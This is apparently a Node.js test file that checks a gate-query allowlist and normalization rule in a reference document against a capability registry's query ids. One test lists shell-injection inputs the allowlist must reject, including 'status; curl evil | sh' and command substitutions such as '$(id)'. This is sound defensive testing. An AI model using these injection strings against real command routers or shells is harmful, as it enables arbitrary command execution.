'use strict';

/**
 * #5647 — the gate-query validation rule in `gsd-core/references/loop-hook-dispatch.md` § `gate` must
 * accept every query id the capability registry ships.
 *
 * The registry declares gate queries in dotted form (`ui.plan-gate`); `gsd_run check` accepts them by
 * turning each `.` into `-` (src/check-command-router.cts). The reference told an orchestrator to check
 * the raw value against a hyphen-and-lowercase-only pattern, so read literally every shipped query gate
 * failed validation and was skipped as a malformed manifest. This test applies the rule as the
 * reference states it: the normalization step when the reference carries one, then the allowlist the
 * reference prints. The allowlist is also the command-injection guard of #3559, so the malformed and
 * shell-active inputs it must keep rejecting are pinned here.
 */

const { describe, test, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const { cleanup, createTempDir } = require('./helpers.cjs');
const { runTools } = require('./helpers/gsd-tools-cli.cjs');
const realRegistry = require('../gsd-core/bin/lib/capability-registry.cjs');

const REFERENCE = path.join(__dirname, '..', 'gsd-core', 'references', 'loop-hook-dispatch.md');

// loop-hook-dispatch.md is shipped content an orchestrator executes: the rule only exists as this text.
const reference = fs.readFileSync(REFERENCE, 'utf8');
const gateSection = reference.slice(reference.indexOf('### `gate`'));

/** The inline-code spans of the § gate text that print an allowlist pattern (they start with `^[a-z]). */
function printedPatterns() {
  const spans = [];
  let from = gateSection.indexOf('`^[a-z]');
  while (from !== -1) {
    const end = gateSection.indexOf('`', from + 1);
    spans.push(gateSection.slice(from + 1, end));
    from = gateSection.indexOf('`^[a-z]', end + 1);
  }
  return spans;
}

/** The one allowlist the § gate text prints. */
function documentedAllowlist() {
  const [pattern] = printedPatterns();
  assert.notStrictEqual(pattern, undefined, 'the § gate text must print the allowlist as an inline-code pattern');
  // allow-adhoc-regex-escape: the pattern is the regex the reference prints, to be applied as a regex, not text to escape
  return new RegExp(pattern);
}

/** The step the reference states before validating: dots to hyphens, when it says so. */
function documentedNormalization() {
  const states = /replace every `\.` with `-`/.test(gateSection);
  return (query) => (states ? query.replace(/\./g, '-') : query);
}

function registryQueries() {
  const queries = new Set();
  for (const point of Object.values(realRegistry.byLoopPoint)) {
    for (const gate of point.gates || []) {
      if (gate.check && typeof gate.check.query === 'string') queries.add(gate.check.query);
    }
  }
  return [...queries].sort();
}

const UNKNOWN_COMMAND = 'sdk_unknown_command';

/** The typed `reason` of a `--json-errors` failure (the CLI prints it to stderr or stdout), else undefined. */
function failureReason(result) {
  for (const stream of [result.stderr, result.stdout]) {
    try {
      const parsed = JSON.parse(String(stream).trim());
      if (parsed !== null && typeof parsed === 'object' && typeof parsed.reason === 'string') return parsed.reason;
    } catch { /* not a JSON error on this stream */ }
  }
  return undefined;
}

const tmpDirs = [];
after(() => { for (const d of tmpDirs) { try { cleanup(d); } catch { /* best-effort */ } } });

describe('gate query validation accepts the registry and rejects the injection surface (#5647)', () => {
  test('the registry ships dotted gate queries (guards against a vacuous pass)', () => {
    const queries = registryQueries();
    assert.ok(queries.length >= 8, `expected the registry's gate queries, found ${queries.length}`);
    assert.ok(queries.some((q) => q.includes('.')), 'the registry declares dotted query ids');
  });

  test('every registry gate query is accepted by the documented validation (#5647)', () => {
    const allowlist = documentedAllowlist();
    const normalize = documentedNormalization();
    const rejected = registryQueries().filter((q) => !allowlist.test(normalize(q)));
    assert.deepEqual(rejected, [], 'queries a literal reading of the reference would skip as malformed');
  });

  test('a normalized registry query reaches a known check (#5647)', (t) => {
    const cwd = createTempDir('gsd-5647-');
    tmpDirs.push(cwd);
    const normalize = documentedNormalization();
    for (const query of registryQueries()) {
      const r = runTools(['check', normalize(query), '--json-errors'], cwd);
      if (r.exitCode === 0) continue; // a gate that ran and answered
      // A failure of a KNOWN check is a typed usage failure (a missing phase argument, for one); only an
      // id the router does not know carries the unknown-command reason.
      const reason = failureReason(r);
      assert.equal(typeof reason, 'string', `${query}: a failing run must report a typed reason, got ${r.stdout}${r.stderr}`);
      assert.notEqual(reason, UNKNOWN_COMMAND, `${query} -> ${normalize(query)} is not a known check`);
    }
    t.diagnostic(`${registryQueries().length} queries routed`);
  });

  test('an unknown check id fails safely at the router (#5647)', () => {
    const cwd = createTempDir('gsd-5647-');
    tmpDirs.push(cwd);
    const query = 'nope.gate';
    assert.ok(documentedAllowlist().test(documentedNormalization()(query)), 'the allowlist alone cannot know the check');
    const r = runTools(['check', documentedNormalization()(query), '--json-errors'], cwd);
    assert.notEqual(r.exitCode, 0, 'an id naming no known check must not succeed');
    assert.equal(failureReason(r), UNKNOWN_COMMAND, 'the router reports it as an unknown command');
  });

  test('a space-separated multi-word query is still accepted (#5647)', () => {
    const allowlist = documentedAllowlist();
    const normalize = documentedNormalization();
    assert.equal(allowlist.test(normalize('ui.plan-gate extra')), true);
    assert.equal(allowlist.test(normalize('status')), true);
  });

  test('malformed and shell-active queries are rejected after normalization (#5647)', () => {
    const allowlist = documentedAllowlist();
    const normalize = documentedNormalization();
    const hostile = [
      'status; curl evil | sh',
      "ui.plan-gate'",
      'ui.plan-gate`id`',
      'ui.plan-gate$(id)',
      'ui.plan-gate\nid',
      'ui.plan-gate\r',
      'UI.plan-gate',
      'ui.Plan-gate',
      '',
      ' ',
      '.ui-plan-gate',
      'ui-plan-gate.',
      'ui..plan-gate',
      'ui.-plan-gate',
      'ui.plan-gate.',
      '-ui',
      '1ui',
      'ui plan-gate ',
      'ui  plan-gate',
      'ui/plan-gate',
      'ui.plan-gate && id',
    ];
    const accepted = hostile.filter((q) => allowlist.test(normalize(q)));
    assert.deepEqual(accepted, [], 'values the allowlist must keep rejecting');
  });

  test('the reference states the normalization and the gate allowlist once (#5647)', () => {
    const printed = printedPatterns();
    assert.equal(printed.length, 1, 'the gate section prints exactly one allowlist');
    assert.ok(/replace every `\.` with `-`/.test(gateSection), 'the gate section states the dot-to-hyphen step');
    assert.ok(
      gateSection.indexOf('replace every `.` with `-`') < gateSection.indexOf(`\`${printed[0]}\``),
      'the normalization is stated before the validation it feeds',
    );
  });
});
